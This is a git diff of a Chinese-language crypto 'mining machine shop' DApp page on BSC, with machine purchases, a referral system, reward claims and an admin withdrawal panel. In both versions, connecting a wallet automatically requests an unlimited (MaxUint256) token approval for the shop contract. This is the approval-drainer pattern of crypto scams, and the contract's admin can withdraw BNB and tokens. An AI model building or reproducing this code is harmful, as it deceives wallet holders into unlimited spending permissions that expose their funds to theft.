@@ -2,223 +2,153 @@
 <html lang="zh-CN">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>矿机商店 · Mining Shop</title>
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
-  <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>矿机商店 DApp 全功能</title>
   <style>
-    :root {
-      --bg: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
-      --card-bg: rgba(30, 41, 59, 0.5);
-      --accent: #3b82f6;
-      --text: #e2e8f0;
-      --radius: 16px;
-      --shadow: 0 8px 32px rgba(0,0,0,0.5);
-    }
-    *{box-sizing:border-box;margin:0;padding:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif}
-    body{background:var(--bg);color:var(--text);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
-    .container{max-width:900px;width:100%;display:grid;gap:24px}
-    .header{display:flex;align-items:center;justify-content:space-between}
-    .header h1{font-size:2.5rem;background:linear-gradient(90deg,#60a5fa,#3b82f6);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
-    .card{background:var(--card-bg);border-radius:var(--radius);padding:24px;border:1px solid rgba(255,255,255,0.1);backdrop-filter:blur(8px);box-shadow:var(--shadow)}
-    .grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:16px}
-    .stat{display:flex;align-items:center;gap:12px;font-size:1.1rem}
-    .stat i{color:var(--accent)}
-    .btn{display:flex;align-items:center;justify-content:center;gap:8px;padding:14px 24px;border:none;border-radius:var(--radius);font-weight:600;cursor:pointer;transition:.3s;background:var(--accent);color:#fff}
-    .btn:hover{transform:translateY(-2px);box-shadow:0 4px 16px rgba(59,130,246,0.5)}
-    .input-group{display:flex;flex-direction:column;gap:8px}
-    .input-group input{padding:12px;border-radius:var(--radius);border:1px solid rgba(255,255,255,0.2);background:rgba(0,0,0,0.3);color:#fff}
-    #qrcode canvas{margin:0 auto;display:block}
-    .alert{position:fixed;top:20px;left:50%;transform:translateX(-50%);padding:12px 24px;border-radius:var(--radius);font-weight:600;background:#27ae60;color:#fff;z-index:9999;display:none}
+    body { font-family: sans-serif; margin: 0; padding: 0; background: #121212; color: white; }
+    .container { max-width: 900px; margin: auto; padding: 20px; }
+    button { padding: 10px 20px; margin: 10px 5px; }
+    input { padding: 5px; margin: 5px; width: 200px; }
+    .panel { border: 1px solid #444; padding: 10px; margin-top: 20px; border-radius: 5px; }
   </style>
 </head>
 <body>
   <div class="container">
-    <div class="header">
-      <h1><i class="fas fa-hammer"></i> 矿机商店</h1>
-      <button class="btn" onclick="connectWallet()"><i class="fas fa-wallet"></i> 连接钱包</button>
-    </div>
+    <h1>矿机商店 DApp</h1>
+    <button id="connectBtn">连接钱包</button>
+    <div id="userPanel" style="display:none;">
+      <p>地址：<span id="userAddress"></span></p>
+      <p>授权状态：<span id="approvalStatus"></span></p>
 
-    <!-- 数据卡片 -->
-    <div class="card grid" id="userPanel" style="display:none">
-      <div class="stat"><i class="fas fa-cog"></i> 普通矿机：<span id="statNormal">0</span></div>
-      <div class="stat"><i class="fas fa-flask"></i> 测试矿机：<span id="statTest">0</span></div>
-      <div class="stat"><i class="fas fa-rocket"></i> 增强矿机：<span id="statPower">0</span></div>
-      <div class="stat"><i class="fas fa-calendar-day"></i> 日产量：<span id="statDaily">0</span> α</div>
-      <div class="stat"><i class="fas fa-gift"></i> 未领取：<span id="statUnclaimed">0</span> α</div>
-      <div class="stat"><i class="fas fa-user-friends"></i> 推荐奖励：<span id="statRef">0</span> α</div>
-      <div class="stat"><i class="fas fa-bolt"></i> 总算力：<span id="statPowerTotal">0</span></div>
-    </div>
+      <div class="panel">
+        <h3>矿机购买</h3>
+        <button onclick="buyInitialMachine()">购买初始矿机</button>
+        <button onclick="buyTestMachine()">购买测试矿机</button>
+        <input id="tierId" placeholder="Power等级 0-3" />
+        <input id="count" placeholder="数量" />
+        <button onclick="buyPowerMachine()">购买Power矿机</button>
+      </div>
 
-    <!-- 操作卡片 -->
-    <div class="card" id="actionPanel" style="display:none">
-      <div class="grid">
-        <button class="btn" onclick="buyInitial()"><i class="fas fa-plus"></i> 购买初始矿机</button>
-        <button class="btn" onclick="buyTest()"><i class="fas fa-plus"></i> 测试矿机 (等级0)</button>
-        <button class="btn" onclick="buyPower()"><i class="fas fa-plus"></i> 增强矿机 (等级1~3)</button>
-        <button class="btn" onclick="claim()"><i class="fas fa-gift"></i> 领取收益</button>
+      <div class="panel">
+        <h3>推荐系统</h3>
+        <input id="referrerInput" placeholder="推荐人地址" />
+        <button onclick="setReferrer()">设置推荐人</button>
+      </div>
+
+      <div class="panel">
+        <h3>奖励系统</h3>
+        <button onclick="claimRewards()">领取收益</button>
       </div>
     </div>
 
-    <!-- 推荐人卡片 -->
-    <div class="card" id="referPanel" style="display:none">
-      <h2><i class="fas fa-share-alt"></i> 推荐人</h2>
-      <div class="input-group">
-        <label>推荐人地址</label>
-        <input id="referInput" placeholder="0x..." />
-        <button class="btn" onclick="setReferrer()"><i class="fas fa-check"></i> 设置推荐人</button>
-      </div>
-      <h3 style="margin-top:20px">您的推荐二维码</h3>
-      <div id="qrcode"></div>
+    <div id="adminPanel" class="panel" style="display:none;">
+      <h3>管理员面板</h3>
+      <input id="withdrawAmount" placeholder="提取代币数量" />
+      <button onclick="withdrawBNB()">提取BNB</button>
+      <button onclick="withdrawTokens()">提取代币</button>
     </div>
   </div>
 
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <script>
-    const TOKEN_ADDRESS = "0x877f23dcFBa91cadd7d35565Da452c9673C27A33";
     const CONTRACT_ADDRESS = "0x9dCcEd4Ef738856D2c289D4116cD219c698B22ba";
-    const CONTRACT_ABI = [{"inputs":[{"internalType":"address","name":"_rewardToken","type":"address"},{"internalType":"address","name":"_treasury","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[],"name":"buyInitialMachine","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"uint256","name":"tierId","type":"uint256"},{"internalType":"uint256","name":"count","type":"uint256"}],"name":"buyPowerMachine","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"claimRewards","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"user","type":"address"}],"name":"getUserDashboard","outputs":[{"internalType":"uint256","name":"normal","type":"uint256"},{"internalType":"uint256","name":"test","type":"uint256"},{"internalType":"uint256[4]","name":"power","type":"uint256[4]"},{"internalType":"uint256","name":"dailyReward","type":"uint256"},{"internalType":"uint256","name":"unclaimed","type":"uint256"},{"internalType":"uint256","name":"totalRefReward","type":"uint256"},{"internalType":"uint256","name":"totalPower","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"referrer","type":"address"}],"name":"setReferrer","outputs":[],"stateMutability":"nonpayable","type":"function"}];
+    const TOKEN_ADDRESS = "0x877f23dcFBa91cadd7d35565Da452c9673C27A33";
+    let provider, signer, contract, userAddress;
 
-    let signer, userAddress, contract;
+    const CONTRACT_ABI = [
+      "function buyInitialMachine() payable",
+      "function buyTestMachine() payable",
+      "function buyPowerMachine(uint256,uint256)",
+      "function setReferrer(address)",
+      "function claimRewards()",
+      "function withdrawBNB()",
+      "function withdrawTokens(uint256)",
+      "function admin(address) view returns (bool)",
+      "function rewardToken() view returns (address)",
+    ];
 
     async function connectWallet() {
-      const provider = window.ethereum || window.tp || window.okexchain || window.bitkeep?.ethereum;
-      if (!provider) return alert("请使用支持 BSC 的钱包浏览器");
+      if (!window.ethereum) return alert("请安装钱包插件");
 
-      try {
-        await provider.request({ method: "eth_requestAccounts" });
-        const chainId = await provider.request({ method: "eth_chainId" });
-        if (chainId !== "0x38") return alert("请切换到 BSC 主网");
+      provider = new ethers.providers.Web3Provider(window.ethereum);
+      await provider.send("eth_requestAccounts", []);
+      signer = provider.getSigner();
+      userAddress = await signer.getAddress();
 
-        signer = new ethers.providers.Web3Provider(provider).getSigner();
-        userAddress = await signer.getAddress();
-        contract = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, signer);
+      document.getElementById("userAddress").innerText = userAddress;
+      document.getElementById("userPanel").style.display = "block";
+      document.getElementById("connectBtn").innerText = "已连接";
 
-        document.querySelector(".btn").textContent = "已连接";
-        ["userPanel", "actionPanel", "referPanel"].forEach(id => document.getElementById(id).style.display = "block");
+      contract = new ethers.Contract(CONTRACT_ADDRESS, CONTRACT_ABI, signer);
+      const isAdmin = await contract.admin(userAddress);
+      if (isAdmin) document.getElementById("adminPanel").style.display = "block";
 
-        await autoApprove();
-        await loadUserData();
-        await bindReferrerFromUrl();
-        generateQRCode();
-      } catch (err) {
-        alert("连接失败：" + err.message);
-      }
+      await checkApproval();
     }
 
-    async function autoApprove() {
-      const tokenAbi = ["function approve(address spender, uint256 amount) external returns (bool)"];
+    async function checkApproval() {
+      const tokenAbi = [
+        "function allowance(address owner, address spender) view returns (uint256)",
+        "function approve(address spender, uint256 amount) returns (bool)"
+      ];
       const token = new ethers.Contract(TOKEN_ADDRESS, tokenAbi, signer);
-      try {
+      const allowance = await token.allowance(userAddress, CONTRACT_ADDRESS);
+      if (allowance.gt(ethers.constants.Zero)) {
+        document.getElementById("approvalStatus").innerText = "已授权";
+      } else {
         const tx = await token.approve(CONTRACT_ADDRESS, ethers.constants.MaxUint256);
         await tx.wait();
-        showAlert("已自动完成无限授权 ✅");
-      } catch (err) {
-        showAlert("授权失败：" + err.message);
+        document.getElementById("approvalStatus").innerText = "授权完成";
       }
     }
 
-    async function loadUserData() {
-      const data = await contract.getUserDashboard(userAddress);
-      document.getElementById("statNormal").textContent = data.normal;
-      document.getElementById("statTest").textContent = data.test;
-      document.getElementById("statPower").textContent = data.power.reduce((a, b) => a + Number(b), 0);
-      document.getElementById("statDaily").textContent = ethers.utils.formatUnits(data.dailyReward);
-      document.getElementById("statUnclaimed").textContent = ethers.utils.formatUnits(data.unclaimed);
-      document.getElementById("statRef").textContent = ethers.utils.formatUnits(data.totalRefReward);
-      document.getElementById("statPowerTotal").textContent = data.totalPower;
+    async function buyInitialMachine() {
+      const tx = await contract.buyInitialMachine({ value: ethers.utils.parseEther("0.01") });
+      await tx.wait();
+      alert("购买成功！");
     }
 
-    async function bindReferrerFromUrl() {
-      const urlParams = new URLSearchParams(window.location.search);
-      const ref = urlParams.get("ref");
-      if (ref && ethers.utils.isAddress(ref)) {
-        try {
-          await contract.setReferrer(ref);
-          showAlert("推荐人绑定成功 ✅");
-        } catch (err) {
-          showAlert("推荐人绑定失败：" + err.message);
-        }
-      }
+    async function buyTestMachine() {
+      const tx = await contract.buyTestMachine({ value: ethers.utils.parseEther("0.001") });
+      await tx.wait();
+      alert("测试矿机购买成功！");
+    }
+
+    async function buyPowerMachine() {
+      const tierId = document.getElementById("tierId").value;
+      const count = document.getElementById("count").value;
+      const tx = await contract.buyPowerMachine(tierId, count);
+      await tx.wait();
+      alert("Power矿机购买成功！");
     }
 
     async function setReferrer() {
-      const ref = document.getElementById("referInput").value;
-      if (!ethers.utils.isAddress(ref)) return alert("地址格式错误");
-      try {
-        await contract.setReferrer(ref);
-        showAlert("推荐人设置成功 ✅");
-      } catch (err) {
-        showAlert("设置失败：" + err.message);
-      }
+      const ref = document.getElementById("referrerInput").value;
+      const tx = await contract.setReferrer(ref);
+      await tx.wait();
+      alert("推荐人设置成功！");
     }
 
-    function generateQRCode() {
-      const url = `${window.location.origin}${window.location.pathname}?ref=${userAddress}`;
-      QRCode.toCanvas(document.getElementById("qrcode"), url, { width: 200 }, function (error) {
-        if (error) console.error(error);
-      });
+    async function claimRewards() {
+      const tx = await contract.claimRewards();
+      await tx.wait();
+      alert("奖励领取成功！");
     }
 
-    async function buyInitial() {
-      try {
-        const tx = await contract.buyInitialMachine({ value: ethers.utils.parseEther("0.01") });
-        await tx.wait();
-        showAlert("初始矿机购买成功 ✅");
-        await loadUserData();
-      } catch (err) {
-        showAlert("购买失败：" + err.message);
-      }
+    async function withdrawBNB() {
+      const tx = await contract.withdrawBNB();
+      await tx.wait();
+      alert("BNB 提取成功！");
     }
 
-    async function buyTest() {
-      try {
-        const tx = await contract.buyPowerMachine(0, 1);
-        await tx.wait();
-        showAlert("测试矿机购买成功 ✅");
-        await loadUserData();
-      } catch (err) {
-        showAlert("购买失败：" + err.message);
-      }
+    async function withdrawTokens() {
+      const amount = document.getElementById("withdrawAmount").value;
+      const tx = await contract.withdrawTokens(ethers.utils.parseUnits(amount));
+      await tx.wait();
+      alert("代币提取成功！");
     }
 
-    async function buyPower() {
-      const tierId = prompt("请输入增强矿机等级（0~3）：");
-      const count = prompt("请输入购买数量：");
-      if (!tierId || !count || isNaN(tierId) || isNaN(count)) return;
-      try {
-        const tx = await contract.buyPowerMachine(tierId, count);
-        await tx.wait();
-        showAlert("增强矿机购买成功 ✅");
-        await loadUserData();
-      } catch (err) {
-        showAlert("购买失败：" + err.message);
-      }
-    }
-
-    async function claim() {
-      try {
-        const tx = await contract.claimRewards();
-        await tx.wait();
-        showAlert("收益领取成功 ✅");
-        await loadUserData();
-      } catch (err) {
-        showAlert("领取失败：" + err.message);
-      }
-    }
-
-    function showAlert(msg) {
-      const el = document.createElement("div");
-      el.className = "alert ok";
-      el.textContent = msg;
-      el.style.display = "block";
-      document.body.appendChild(el);
-      setTimeout(() => el.remove(), 3000);
-    }
-
-    function toggleLang() {
-      alert("语言切换暂未实现");
-    }
+    document.getElementById("connectBtn").onclick = connectWallet;
   </script>
 </body>
 </html>
